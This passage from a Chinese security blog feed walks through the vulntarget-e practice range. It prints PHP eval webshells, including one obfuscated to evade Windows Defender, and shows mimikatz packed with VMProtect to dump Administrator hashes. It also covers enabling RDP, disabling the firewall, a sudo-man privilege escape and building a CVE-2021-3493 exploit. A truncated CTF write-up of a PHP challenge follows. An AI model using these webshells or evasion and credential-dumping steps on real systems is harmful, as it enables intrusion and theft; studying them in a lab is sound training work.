class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[g]);?&gt;&#x27;</span> &gt; a.php</span><br><span class="line">cat a.php</span><br><span class="line">http://192.168.144.55/a.php</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129203359747.png" alt="image-20221129203359747"></p><p>信息收集一波，环境并没有装net-tools，没有ifconfig ，所以我们<code>ip a</code> 也可以查看ip，两块网卡，内网还有一个20的段</p><p><img src="/images/vulntarget-e/image-20221129203818846.png" alt="image-20221129203818846"></p><p>然后上个lse 或者linux-exploit-suggester-master 进行提权一下，当然不提也没关系，不影响后面。这里笔者把上面两个提权辅助工具都跑了一下，并没有发现什么好的提权方法，看了眼wp，说有弱口令。那肯定是看passwd文件，知道用户名<code>vulntarget</code>，然后爆破一下。</p><p><img src="/images/vulntarget-e/image-20221129211426271.png" alt="image-20221129211426271"></p><p>那这样的话，连上去就可以了。我们这里还是用蚁剑吧</p><p><img src="/images/vulntarget-e/image-20221129213522722.png" alt="image-20221129213522722"></p><p>./fscan_amd64 -h 10.0.20.141/24 -o a.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 10.0.20.141/24 -o a.txt</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">似乎并没有扫到内网，因为这台是win的机器，可能是防火墙的作用。我们加个np 禁ping扫</span><br><span class="line"></span><br><span class="line">./fscan_amd64 -h 10.0.20.141/24 -pn -o s.txt</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">10.0.20.100:80 open</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.100:443 open</span><br><span class="line">[*] WebTitle:https://10.0.20.100       code:403 len:301    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line">[*] WebTitle:http://10.0.20.100        code:200 len:42     title:Online Veterinary Appointment System - PHP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到还有一个100的机器，且开了80并且是一个winserver,挂代理访问</p><p>那么直接上代理，这里笔者上ew，把内网带出来。拖个ew上去，改一下777权限.当然其他代理软件也行，不唯一</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s ssocksd -l 8887</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129215012297.png" alt="image-20221129215012297"></p><p><img src="/images/vulntarget-e/image-20221129215310468.png" alt="image-20221129215310468"></p><p>用proxifier加个servers地址写外网地址，端口写代理端口</p><p>新加一个规则，我们写通往20的段，走代理</p><p><img src="/images/vulntarget-e/image-20221129215644648.png" alt="image-20221129215644648"></p><p><img src="/images/vulntarget-e/image-20221129215733868.png" alt="image-20221129215733868"></p><p>我们可以看到能成功访问20段ip了。</p><p>记一个坑：我在上完ew后启动了之后使用谷歌带的那个插件[SwitchyOmega] 也加了一个代理，然后去访问这个网站，前几次还行，三五条访问之后这个链路就挂了，</p><p>linux中ew报<code>Segmentation fault (core dumped)</code> 先开始我以为是ew版本不对或者蚁剑执行命令的问题，因为以前没有出现过这个情况，我又去shell里测了一下，发现，浏览器可能有插件可能会访问谷歌或者其他外网，然后就停掉了。我用了proxifier只加目标地址段没有出现任何问题。可能是访问外网的原因。没关系，解决了就好了</p><p><img src="/images/vulntarget-e/image-20221129221150992.png" alt="image-20221129221150992"></p><h3 id="OVAS-PHP-漏洞拿shell，免杀df"><a href="#OVAS-PHP-漏洞拿shell，免杀df" class="headerlink" title="OVAS - PHP 漏洞拿shell，免杀df"></a>OVAS - PHP 漏洞拿shell，免杀df</h3><p>开局给到一个cms，刚开始打的时候，我去google了一圈也找到利用的方法，甚至连提到这个cms的文章都很少，（除了其他佬写的wp），就去扫了目录看看有啥提示。然后回来再看看发现右上角有个adminlogin ，试着抓包看一下，我们看到username，password都是明文且没有验证码，存在爆破的条件，我们加载字典爆破一下。爆破成功admin，admin123</p><p><img src="/images/vulntarget-e/image-20221129221707205.png" alt="image-20221129221707205"></p><p><img src="/images/vulntarget-e/image-20221129221813516.png" alt="image-20221129221813516"></p><p>我们登录后台，那肯定是想办法拿shell了，看看有没有啥上传点，经过测试在settings中我们可以利用，settings中在welcome中添加一个图片，然后在随便选一个图片，点最下面update提交</p><p><img src="/images/vulntarget-e/image-20221130103146247.png" alt="image-20221130103146247"></p><p>然后在你插的那张图片中的base64编码中插入一句话，在最开始没看wp的时候，我就写了简单的phpinfo是没有问题的，我上传普通一句话木马，文件就报错，主页面显示include错误，以为是哪里打错了，网站崩了，后来发现并不是，我登上去win发现，win上开的有df，直接把我的🐎儿杀了，phpinfo不杀，不过也没关系，df对webshell查杀的能力比较差，网上随便找个简单免杀就能过。这里笔者提供一个。既然登上去了，笔者就把df更新到最新版了，这个🐎儿依然能用。下面都是基于做新版的df，time-22.11.28</p><p><img src="/images/vulntarget-e/image-20221130200829649.png" alt="image-20221130200829649"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bohemian</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;/*bohemian*/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;g&#x27;</span>].<span class="string">&quot;/*bohemian**/&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">@<span class="keyword">eval</span>(bohemian());phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130104355866.png" alt="image-20221130104355866"></p><p>这里把包发过去就可以了，里面有个phpinfo 我们方便查看，去到主页看看</p><p><img src="/images/vulntarget-e/image-20221130103829535.png" alt="image-20221130103829535"></p><p><img src="/images/vulntarget-e/image-20221130110109643.png" alt="image-20221130110109643"></p><p>没有问题，蚁剑连一下。成功拿到shell</p><p><img src="/images/vulntarget-e/image-20221130110051787.png" alt="image-20221130110051787"></p><p>上来就能看到system权限，且有两块网卡，内部还有一个10的段</p><p><img src="/images/vulntarget-e/image-20221130110251974.png" alt="image-20221130110251974"></p><p>信息收集一波我们知道是开着df的先去桌面翻翻看，桌面上没有什么东西，但是这个目录C:/Users/Administrator/有个flag文件，内容<code>vulntarget&#123;VGhlIGhvc3QgcGFzc3dvcmQgbWF5IGJlIHVzZWQgZm9yIG90aGVyIHB1cnBvc2Vz&#125;  +_+</code>典型的base64  解一下，<code>The host password may be used for other purposes</code>笔者工地英语翻一下，大致的意思是这个电脑的密码会被用到其他地方。那么我们肯定去抓密码了。那就在这网站路径下穿个mimikatz，当然我们传上去肯定秒杀，df对mimikatz非常敏感的，这里我们呢去做一个简单免杀。</p><p>如果想深入研究mimikatz的免杀，参考这位佬的文章，Mimikatz的18种免杀姿势及防御策略<code>https://www.freebuf.com/news/234365.html</code></p><p>这里笔者提供一种非常简单的免杀操作，就是加壳，非常简单拿工具去生成一个就行。</p><p><code>当然这里免杀的操作其实都可以不做，为什么呢，因为上面其实我们已经是system权限了，我们其实把df关掉就行，但是这里是靶场，联系一下没有坏处</code></p><p>下面我们先对mimikatz免杀，打开VMProtect,选择mimikatz就行了，他就会编译了，然后会生成mimikatzvm.vmp.exe，把这个传上去就行了</p><p><img src="/images/vulntarget-e/image-20221130112521657.png" alt="image-20221130112521657"></p><p><img src="/images/vulntarget-e/image-20221130112528427.png" alt="image-20221130112528427"></p><p>这里没有交互式shell我们用mimikatz抓的话，直接导出结果就行</p><p><code>mimikatzvm.vmp.exe &quot;sekurlsa::logonpasswords&quot; exit &gt; s.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msv :</span><br><span class="line"> [00000005] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : WIN-JJJBQ4N87RA</span><br><span class="line"> * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e</span><br><span class="line"> * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>dfc8d2bfa540a0a6e2248a82322e654e<br>ntlm<br>Admin#123</p><p>md5网站解一下就有了，</p><p>我们在上个fscan扫下下个网段，上个win的，这里上传上去直接报毒了，然后杀掉了</p><p><img src="/images/vulntarget-e/image-20221130201732733.png" alt="image-20221130201732733"></p><p>没关系，有个师傅二开了fscan的，<code>https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</code>我们去试一下，</p><p>这个文件有点大，20多m，蚁剑超时的话就上传失败了，我们改一下超时时间，改大点</p><p><img src="/images/vulntarget-e/image-20221130202142743.png" alt="image-20221130202142743"></p><p>笔者在这里上传成功了，但是不能用，笔者又传了一遍，这样的话三次了，全部叠加了一起并没有覆盖，我们从新改个名字传，或者删了又传了几遍，还是没成功，可能是代理的问题，文件有点大，作者说了，这里打包出来的fscan就是这么大没有压缩，可以自己压缩，upx压一下，或者上面那个工具，我们试下godzilla大文件上传</p><p><img src="/images/vulntarget-e/image-20221130202622434.png" alt="image-20221130202622434"></p><p><img src="/images/vulntarget-e/image-20221130202834288.png" alt="image-20221130202834288"></p><p>这里小tip，哥斯拉是可以连接一句话的。所以直接连就行</p><p><img src="/images/vulntarget-e/image-20221130204635575.png" alt="image-20221130204635575"></p><p>这里哥斯拉传上来没有问题，图没截</p><p><img src="/images/vulntarget-e/image-20221130205528351.png" alt="image-20221130205528351"></p><p>.\fscan_win_amd64.exe -h 10.0.10.0/24 -o r.txt</p><p><img src="/images/vulntarget-e/image-20221130205706916.png" alt="image-20221130205706916"></p><p>我们可以看到有个20的段 110的ip只开了22端口，显然是台linux了，估计又是弱口令，或者漏洞了。</p><p>正常思路是上ew，然后打后一个网端，但是这里不是这样的，我们要获取远程桌面，开下3389其实这样做在实战中是非常危险的，容易被发现。不过这里还是先要这样操作。</p><p>我们先cmd把3389开了<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p><p><img src="/images/vulntarget-e/image-20221130210751420.png" alt="image-20221130210751420"></p><p>打开之后直接登录就行了，administrator/Admin#123</p><p><img src="/images/vulntarget-e/image-20221130210947108.png" alt="image-20221130210947108"></p><p>哦对了，其实还是连不上，防火墙开着，我们再把防火墙关了</p><p><code>netsh advfirewall set allprofiles state off</code>\</p><p><img src="/images/vulntarget-e/image-20221130211126227.png" alt="image-20221130211126227"></p><p>就连上来了</p><p><img src="/images/vulntarget-e/image-20221130211216240.png" alt="image-20221130211216240"></p><p>下面有一个moba，我们打开是要密码的，然后输一下刚刚administrator的密码，上面flag说了,密码会用到其他地方，</p><p><img src="/images/vulntarget-e/image-20221130211247112.png" alt="image-20221130211247112"></p><h3 id="moba利用、cve-2021-3493"><a href="#moba利用、cve-2021-3493" class="headerlink" title="moba利用、cve_2021_3493"></a>moba利用、cve_2021_3493</h3><h4 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h4><p>直接就可以连上来，我们可以看到是一个vulntarget的普通用户，那肯定是想办法提权，上lse等等，这边笔者提供两个方法，一个是预期解和一个非预期解，非预期解是一个简单的提权方法，有很多机器如果你有了一个普通的可以登录的账户可以试试这个，屡试不爽。sudo漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">输入这个用户的密码</span><br><span class="line">！</span><br><span class="line">出去就是root了</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130211440233.png" alt="image-20221130211440233"></p><p>但是这里我们并不知道vulntarget的密码，因为上面进来的时候是输入的moba的安全密码，并不是ssh的密码，但是这里是可以看到的，依次点击settings-&gt;configuration-&gt;mobapasswords-&gt;show passs-&gt;这个pass就是moba的安全密码，</p><p><img src="/images/vulntarget-e/image-20221130212059351.png" alt="image-20221130212059351"></p><p><img src="/images/vulntarget-e/image-20221130212240621.png" alt="image-20221130212240621"></p><p>右面就会显示密码了，vuln@qwe好接下来sudo提权</p><p>sudo man man</p><p>vuln@qwe</p><p>!</p><p>回车</p><p><img src="/images/vulntarget-e/image-20221130212542320.png" alt="image-20221130212542320"></p><p><img src="/images/vulntarget-e/image-20221130212417710.png" alt="image-20221130212417710"></p><p><img src="/images/vulntarget-e/image-20221130212706685.png" alt="image-20221130212706685"></p><p>至此就拿下了最后一台靶机，root下有个flag，<code>find /* -name &quot;*flag*&quot;</code></p><p><img src="/images/vulntarget-e/image-20221130213029531.png" alt="image-20221130213029531"></p><p>瞅一眼，</p><p>root@ubuntu:~# cat /root/flag<br>Congratulations on winning the final flag</p><p>vulntarget{cve_2021_3493_local_privilege_promotion_overlayfs}</p><p>可以看到有一个2021_3493,是那个提权漏洞。</p><p>笔者这里跑了一下root密码，没出，emmmmm</p><p><img src="/images/vulntarget-e/image-20221130220156785.png" alt="image-20221130220156785"></p><h4 id="以上就是非预期解，下面是预期解"><a href="#以上就是非预期解，下面是预期解" class="headerlink" title="以上就是非预期解，下面是预期解"></a>以上就是非预期解，下面是预期解</h4><p><code>git clone https://github.com/briskets/CVE-2021-3493</code></p><p>cd进去</p><p>找一台ubuntu去克隆一下这个exp项目，这里注意若是在kali上编译，拿出来去目标机上执行会报错，找不到so文件。</p><p><code>gcc exploit.c -o exploit</code> </p><p>编译一下，拖出来到目标机上，这里拖到win上会报毒，我这里直接把df关掉吧，如果不想关了，就打个tar包，到目标机上在解压，rdp不能拖的话，可以复制粘贴，</p><p><img src="/images/vulntarget-e/image-20221130215219417.png" alt="image-20221130215219417"></p><p>这样也拿下了这台机器。至此整个靶场就打完了。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>参考文章</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/crow821/vulntarget <span class="comment">#靶场官方地址</span></span><br><span class="line">https://mp.weixin.qq.com/s/cisoqDnsHqyzCFdx-eG5TQ <span class="comment">#作者的搭建与打靶记录</span></span><br><span class="line">https://www.freebuf.com/articles/web/333566.html <span class="comment">#vulntarget漏洞靶场系列（三）：vulntarget-c</span></span><br><span class="line">https://cloud.tencent.com/developer/article/1171183 <span class="comment">#九种姿势运行Mimikatz</span></span><br><span class="line">https://www.freebuf.com/news/234365.html <span class="comment">#Mimikatz的18种免杀姿势及防御策略</span></span><br><span class="line">https://www.freebuf.com/vuls/280508.html <span class="comment">#Laravel RCE（CVE-2021-3129）漏洞复现</span></span><br></pre></td></tr></table></figure><p>用到工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VMProtect Ultimate 3.4.0加壳软件</span><br><span class="line">https://pan.baidu.com/s/1VXaZgZ1YlVQW9P3B_ciChg 提取码: emnq</span><br><span class="line">此百度网盘原链在`https://www.freebuf.com/news/234365.html`中</span><br><span class="line"></span><br><span class="line">二开fscan</span><br><span class="line">https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><blockquote><p>因为个人能力有限，文章中若有错误，敬请斧正<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> 靶场 </tag>
            
            <tag> vulntarget-c </tag>
            
            <tag> laravel </tag>
            
            <tag> OVAS-PHP相关漏洞 </tag>
            
            <tag> 隧道代理 </tag>
            
            <tag> 提权 </tag>
            
            <tag> CVE-2021-3129 </tag>
            
            <tag> CVE-2021-3493 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届北京大学信息安全综合能力竞赛部分wp</title>
      <link href="/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20221124111931793.png" alt="image-20221124111931793"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022年天津市大学生信息安全网络攻防大赛部分wp</title>
      <link href="/2022/09/29/CTFS/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/29/CTFS/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>本来想不记录了 ，也都是网上能搜到的题，最后想了一下还是记录一下吧</p><h2 id="理论题"><a href="#理论题" class="headerlink" title="理论题"></a>理论题</h2><p>没啥意思</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="最好的语言"><a href="#最好的语言" class="headerlink" title="最好的语言"></a>最好的语言</h3><p>300pt (已做出) 考点 is_number array_search() 弱类型比较<br>赛题地址<code>http://ctftime1.usaas.net/web/good/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先来看最后一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">这里存在判断 abcd都要为<span class="number">1</span>也就是<span class="literal">true</span>  才可以<span class="keyword">echo</span> flag</span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>get传个x1 并且  $x1==”1”?die(“ha?”):NULL;  三目运算符，这句意思是否为1  为1则die<br>那我们为x1 为0  switch 会先经过0  没有break  接着会case1 这样  a=1了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span 